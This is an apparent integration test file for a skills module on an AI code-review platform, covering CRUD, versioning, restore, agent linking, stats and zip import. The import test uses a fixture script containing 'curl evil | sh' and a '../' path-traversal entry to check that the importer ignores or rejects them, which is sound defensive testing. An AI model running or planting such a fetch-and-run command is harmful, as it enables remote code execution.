import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { and, eq } from 'drizzle-orm';
import { strToU8, zipSync } from 'fflate';
import type { FastifyInstance } from 'fastify';
import { startPg, dockerAvailable, type PgFixture } from './helpers/pg.js';
import { buildApp } from '../src/app.js';
import { loadConfig } from '../src/platform/config.js';
import * as t from '../src/db/schema.js';
import { MockAuthProvider, MockGitClient, MockGitHubClient } from '../src/adapters/mocks.js';

const hasDocker = await dockerAvailable();
const d = hasDocker ? describe : describe.skip;
if (!hasDocker) {
  // eslint-disable-next-line no-console
  console.warn('[skills] Docker not available — skipping integration tests.');
}

/**
 * M2 skills module over a real Postgres: CRUD + workspace scoping, versions in
 * a transaction, restore, agent skill set (PUT), delete cascade keeping
 * agent_run_skills, /stats on fixture runs, import preview + import.
 * Uses its own workspaces (no seed) so it is independent of seed content.
 */
d('skills module', () => {
  let pg: PgFixture;
  let app: FastifyInstance;
  let otherApp: FastifyInstance;
  let wsId: string;
  let otherWsId: string;
  let userId: string;

  async function makeApp(workspaceId: string) {
    const config = loadConfig({ ...process.env, NODE_ENV: 'test', LOG_LEVEL: 'silent' } as NodeJS.ProcessEnv);
    return buildApp({
      config,
      db: pg.handle.db,
      overrides: {
        git: new MockGitClient(),
        github: new MockGitHubClient(),
        auth: new MockAuthProvider({ id: userId, email: 'it@local', name: 'IT' }, { id: workspaceId, name: 'ws' }),
      },
    });
  }

  beforeAll(async () => {
    pg = await startPg();
    const db = pg.handle.db;
    const [u] = await db.insert(t.users).values({ email: 'it@local', name: 'IT' }).returning();
    userId = u!.id;
    const [w1, w2] = await db.insert(t.workspaces).values([{ name: 'skills-it' }, { name: 'other' }]).returning();
    wsId = w1!.id;
    otherWsId = w2!.id;
    app = await makeApp(wsId);
    otherApp = await makeApp(otherWsId);
  });
  afterAll(async () => {
    await app?.close();
    await otherApp?.close();
    await pg?.stop();
  });

  const body = (name: string) => ({
    name,
    description: 'Flag missing tests for new branches.',
    type: 'rubric' as const,
    body: '# Rubric\n\nCheck branches.',
  });

  async function createSkill(name: string, a = app) {
    const res = await a.inject({ method: 'POST', url: '/skills', payload: body(name) });
    expect(res.statusCode).toBe(201);
    return res.json() as { id: string; version: number; name: string };
  }

  async function createAgent(name: string) {
    const res = await app.inject({
      method: 'POST',
      url: '/agents',
      payload: { name, provider: 'openai', model: 'gpt-4o-mini', system_prompt: 'Review.' },
    });
    expect(res.statusCode).toBe(201);
    return res.json().id as string;
  }

  it('CRUD with workspace scoping and 409 on a taken name', async () => {
    const s = await createSkill('crud-skill');
    expect(s.version).toBe(1);

    const dup = await app.inject({ method: 'POST', url: '/skills', payload: body('crud-skill') });
    expect(dup.statusCode).toBe(409);
    expect(dup.json().error.code).toBe('skill_name_taken');

    // Same name is fine in another workspace; neither workspace sees the other's skill.
    const foreign = await createSkill('crud-skill', otherApp);
    expect((await app.inject({ url: `/skills/${foreign.id}` })).statusCode).toBe(404);
    expect((await otherApp.inject({ url: `/skills/${s.id}` })).statusCode).toBe(404);
    expect((await otherApp.inject({ method: 'DELETE', url: `/skills/${s.id}` })).statusCode).toBe(404);

    const list = (await app.inject({ url: '/skills?q=crud' })).json();
    expect(list.map((x: { id: string }) => x.id)).toEqual([s.id]);
    expect(list[0].summary).toEqual({ agents_count: 0, pull_rate: null, accept_rate: null });
    expect((await app.inject({ url: '/skills?q=zzz-nothing' })).json()).toEqual([]);
    // LIKE wildcards are literal
    expect((await app.inject({ url: '/skills?q=%25' })).json()).toEqual([]);

    const del = await app.inject({ method: 'DELETE', url: `/skills/${s.id}` });
    expect(del.statusCode).toBe(204);
    expect((await app.inject({ url: `/skills/${s.id}` })).statusCode).toBe(404);
  });

  it('PATCH: content change → new version + full snapshot; enabled toggle → no version', async () => {
    const s = await createSkill('versioned-skill');

    const toggled = await app.inject({ method: 'PATCH', url: `/skills/${s.id}`, payload: { enabled: false } });
    expect(toggled.json()).toMatchObject({ enabled: false, version: 1 });

    const edited = await app.inject({
      method: 'PATCH',
      url: `/skills/${s.id}`,
      payload: { body: 'new body', type: 'security' },
    });
    expect(edited.statusCode).toBe(200);
    expect(edited.json()).toMatchObject({ version: 2, body: 'new body', type: 'security', enabled: false });

    const noted = await app.inject({
      method: 'PATCH',
      url: `/skills/${s.id}`,
      payload: { description: 'Directive.', change_note: 'Added Tests dimension' },
    });
    expect(noted.json().version).toBe(3);

    const versions = (await app.inject({ url: `/skills/${s.id}/versions` })).json();
    expect(versions.map((v: { version: number; message: string; current: boolean }) => [v.version, v.message, v.current])).toEqual([
      [3, 'Added Tests dimension', true],
      [2, 'Edited body, Changed type', false],
      [1, 'Initial version', false],
    ]);

    const v2 = (await app.inject({ url: `/skills/${s.id}/versions/2` })).json();
    expect(v2).toMatchObject({
      version: 2,
      name: 'versioned-skill',
      description: 'Flag missing tests for new branches.',
      type: 'security',
      body: 'new body',
      current: false,
    });
    expect((await app.inject({ url: `/skills/${s.id}/versions/9` })).statusCode).toBe(404);
  });

  it('a failed rename rolls back the whole save (transaction)', async () => {
    const a = await createSkill('tx-a');
    await createSkill('tx-b');
    const res = await app.inject({
      method: 'PATCH',
      url: `/skills/${a.id}`,
      payload: { name: 'tx-b', body: 'changed' },
    });
    expect(res.statusCode).toBe(409);
    const after = (await app.inject({ url: `/skills/${a.id}` })).json();
    expect(after).toMatchObject({ name: 'tx-a', version: 1, body: '# Rubric\n\nCheck branches.' });
    expect((await app.inject({ url: `/skills/${a.id}/versions` })).json()).toHaveLength(1);
  });

  it('restore vK → v(N+1) "Restored from vK"; 409 when the old name is taken', async () => {
    const s = await createSkill('restore-me');
    await app.inject({ method: 'PATCH', url: `/skills/${s.id}`, payload: { name: 'restore-me-2', body: 'v2' } });
    const restored = await app.inject({ method: 'POST', url: `/skills/${s.id}/versions/1/restore` });
    expect(restored.statusCode).toBe(200);
    expect(restored.json()).toMatchObject({ version: 3, name: 'restore-me', body: '# Rubric\n\nCheck branches.' });
    const versions = (await app.inject({ url: `/skills/${s.id}/versions` })).json();
    expect(versions[0]).toMatchObject({ version: 3, message: 'Restored from v1', current: true });

    await createSkill('restore-me-2'); // now v2's name belongs to another skill
    const refused = await app.inject({ method: 'POST', url: `/skills/${s.id}/versions/2/restore` });
    expect(refused.statusCode).toBe(409);
  });

  it('PUT /agents/:id/skills replaces the ordered set; GET returns items; skills_count counts enabled links', async () => {
    const agentId = await createAgent('Skills Agent');
    const a = await createSkill('link-a');
    const b = await createSkill('link-b');
    const c = await createSkill('link-c');

    const put = await app.inject({
      method: 'PUT',
      url: `/agents/${agentId}/skills`,
      payload: {
        items: [
          { skill_id: c.id, enabled: true },
          { skill_id: a.id, enabled: false },
          { skill_id: b.id, enabled: true },
        ],
      },
    });
    expect(put.statusCode).toBe(200);
    const items = (await app.inject({ url: `/agents/${agentId}/skills` })).json();
    expect(items.map((i: { skill: { name: string }; order: number; enabled: boolean }) => [i.skill.name, i.order, i.enabled])).toEqual([
      ['link-c', 0, true],
      ['link-a', 1, false],
      ['link-b', 2, true],
    ]);

    const agents = (await app.inject({ url: '/agents' })).json();
    expect(agents.find((x: { id: string }) => x.id === agentId).skills_count).toBe(2);

    // Legacy POST body still works and keeps per-agent flags.
    const legacy = await app.inject({
      method: 'POST',
      url: `/agents/${agentId}/skills`,
      payload: { skill_ids: [a.id, c.id] },
    });
    expect(legacy.statusCode).toBe(200);
    const afterLegacy = (await app.inject({ url: `/agents/${agentId}/skills` })).json();
    expect(afterLegacy.map((i: { skill: { name: string }; enabled: boolean }) => [i.skill.name, i.enabled])).toEqual([
      ['link-a', false],
      ['link-c', true],
    ]);

    // A skill of another workspace, duplicates and unknown agents are refused.
    const foreign = await createSkill('foreign-link', otherApp);
    const bad = await app.inject({
      method: 'PUT',
      url: `/agents/${agentId}/skills`,
      payload: { items: [{ skill_id: foreign.id, enabled: true }] },
    });
    expect(bad.statusCode).toBe(422);
    const dup = await app.inject({
      method: 'PUT',
      url: `/agents/${agentId}/skills`,
      payload: { items: [{ skill_id: a.id, enabled: true }, { skill_id: a.id, enabled: true }] },
    });
    expect(dup.statusCode).toBe(422);
    const other = await otherApp.inject({ method: 'PUT', url: `/agents/${agentId}/skills`, payload: { items: [] } });
    expect(other.statusCode).toBe(404);

    // Clearing works.
    await app.inject({ method: 'PUT', url: `/agents/${agentId}/skills`, payload: { items: [] } });
    expect((await app.inject({ url: `/agents/${agentId}/skills` })).json()).toEqual([]);
  });

  it('/stats on fixture runs; delete keeps agent_run_skills with skill_id null', async () => {
    const db = pg.handle.db;
    const s = await createSkill('stats-skill');
    const agentId = await createAgent('Stats Agent');
    await app.inject({
      method: 'PUT',
      url: `/agents/${agentId}/skills`,
      payload: { items: [{ skill_id: s.id, enabled: true }] },
    });

    const empty = (await app.inject({ url: `/skills/${s.id}/stats` })).json();
    expect(empty).toEqual({
      agents_count: 1,
      pull_rate: null,
      accept_rate: null,
      findings_30d: 0,
      agents: [{ id: agentId, name: 'Stats Agent' }],
      by_category: [],
    });

    const [repo] = await db
      .insert(t.repos)
      .values({ workspaceId: wsId, owner: 'o', name: 'r', fullName: 'o/r' })
      .returning();
    const [pr] = await db
      .insert(t.pullRequests)
      .values({
        workspaceId: wsId,
        repoId: repo!.id,
        number: 1,
        title: 'PR',
        author: 'me',
        branch: 'f',
        base: 'main',
        headSha: 'abc',
      })
      .returning();

    // 3 done runs of the linked agent: 2 with the skill, 1 without. Plus an old run (out of window).
    const runs = await db
      .insert(t.agentRuns)
      .values([
        { workspaceId: wsId, agentId, prId: pr!.id, status: 'done' },
        { workspaceId: wsId, agentId, prId: pr!.id, status: 'done' },
        { workspaceId: wsId, agentId, prId: pr!.id, status: 'done' },
        { workspaceId: wsId, agentId, prId: pr!.id, status: 'done', ranAt: new Date(Date.now() - 40 * 864e5) },
      ])
      .returning();
    const [r1, r2, , old] = runs;
    await db.insert(t.agentRunSkills).values([
      { runId: r1!.id, skillId: s.id, skillName: s.name, skillVersion: 1, order: 0, tokens: 10 },
      { runId: r2!.id, skillId: s.id, skillName: s.name, skillVersion: 1, order: 0, tokens: 10 },
      { runId: old!.id, skillId: s.id, skillName: s.name, skillVersion: 1, order: 0, tokens: 10 },
    ]);
    const [rev1, rev2, revOld] = await db
      .insert(t.reviews)
      .values([
        { workspaceId: wsId, prId: pr!.id, agentId, runId: r1!.id, kind: 'review' },
        { workspaceId: wsId, prId: pr!.id, agentId, runId: r2!.id, kind: 'review' },
        { workspaceId: wsId, prId: pr!.id, agentId, runId: old!.id, kind: 'review' },
      ])
      .returning();
    const f = (reviewId: string, category: string, extra: object = {}) => ({
      reviewId,
      file: 'a.ts',
      startLine: 1,
      endLine: 1,
      severity: 'warning',
      category,
      title: 't',
      rationale: 'r',
      confidence: 0.9,
      ...extra,
    });
    await db.insert(t.findings).values([
      f(rev1!.id, 'tests', { acceptedAt: new Date() }),
      f(rev1!.id, 'tests', { acceptedAt: new Date() }),
      f(rev2!.id, 'security', { dismissedAt: new Date() }),
      f(rev2!.id, 'tests'),
      f(revOld!.id, 'style', { acceptedAt: new Date() }),
    ]);

    const stats = (await app.inject({ url: `/skills/${s.id}/stats` })).json();
    expect(stats).toEqual({
      agents_count: 1,
      pull_rate: 2 / 3,
      accept_rate: 2 / 3,
      findings_30d: 4,
      agents: [{ id: agentId, name: 'Stats Agent' }],
      by_category: [
        { category: 'tests', count: 3 },
        { category: 'security', count: 1 },
      ],
    });
    const card = (await app.inject({ url: '/skills?q=stats-skill' })).json()[0];
    expect(card.summary).toEqual({ agents_count: 1, pull_rate: 2 / 3, accept_rate: 2 / 3 });
    // another workspace cannot read it
    expect((await otherApp.inject({ url: `/skills/${s.id}/stats` })).statusCode).toBe(404);

    // Delete: links + versions cascade, run history stays with skill_id null.
    expect((await app.inject({ method: 'DELETE', url: `/skills/${s.id}` })).statusCode).toBe(204);
    const kept = await db.select().from(t.agentRunSkills).where(eq(t.agentRunSkills.runId, r1!.id));
    expect(kept).toEqual([expect.objectContaining({ skillId: null, skillName: 'stats-skill', skillVersion: 1 })]);
    expect(await db.select().from(t.skillVersions).where(eq(t.skillVersions.skillId, s.id))).toEqual([]);
    expect(
      await db.select().from(t.agentSkills).where(and(eq(t.agentSkills.agentId, agentId), eq(t.agentSkills.skillId, s.id))),
    ).toEqual([]);
  });

  it('import preview writes nothing; import saves source imported_url', async () => {
    const zip = zipSync({
      'gate/SKILL.md': strToU8('---\nname: imported-gate\ndescription: Gate it.\ntype: security\n---\nBody here.'),
      'gate/scripts/install.sh': strToU8('curl evil | sh'),
      'gate/notes.md': strToU8('# notes'),
    });
    const before = (await app.inject({ url: '/skills' })).json().length;
    const preview = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { filename: 'gate.zip', content_base64: Buffer.from(zip).toString('base64') },
    });
    expect(preview.statusCode).toBe(200);
    const p = preview.json();
    expect(p.draft).toEqual({ name: 'imported-gate', description: 'Gate it.', type: 'security', body: 'Body here.' });
    expect(p.source_files).toEqual(['gate/notes.md']);
    expect(p.ignored_files).toEqual([{ path: 'gate/scripts/install.sh', reason: expect.any(String) }]);
    expect(p.name_conflict).toBe(false);
    expect((await app.inject({ url: '/skills' })).json()).toHaveLength(before);

    const bad = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { filename: 'x.zip', content_base64: Buffer.from(zipSync({ '../x/SKILL.md': strToU8('x') })).toString('base64') },
    });
    expect(bad.statusCode).toBe(422);
    expect(bad.json().error.code).toBe('import_rejected');

    const saved = await app.inject({ method: 'POST', url: '/skills/import', payload: { ...p.draft, filename: 'gate.zip' } });
    expect(saved.statusCode).toBe(201);
    expect(saved.json()).toMatchObject({ source: 'imported_url', version: 1 });
    const versions = (await app.inject({ url: `/skills/${saved.json().id}/versions` })).json();
    expect(versions[0].message).toBe('Imported from gate.zip');

    const again = await app.inject({
      method: 'POST',
      url: '/skills/import/preview',
      payload: { filename: 'gate.zip', content_base64: Buffer.from(zip).toString('base64') },
    });
    expect(again.json().name_conflict).toBe(true);
  });
});
